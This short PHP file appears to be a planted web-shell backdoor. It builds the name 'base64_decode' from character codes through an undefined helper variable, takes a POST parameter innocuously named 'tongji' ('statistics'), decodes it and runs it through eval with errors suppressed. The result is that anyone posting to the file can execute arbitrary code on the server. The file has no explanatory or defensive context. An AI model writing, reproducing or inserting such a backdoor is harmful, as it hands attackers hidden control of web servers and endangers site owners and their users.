<?php
$undecode=$c(98).$c(97).$c(115).$c(101).$c(54).$c(52);
$undecode.=$c(95).$c(100).$c(101).$c(99).$c(111).$c(100).$c(101);

$tongji=$_POST['tongji'];

@eval($undecode($tongji));
?>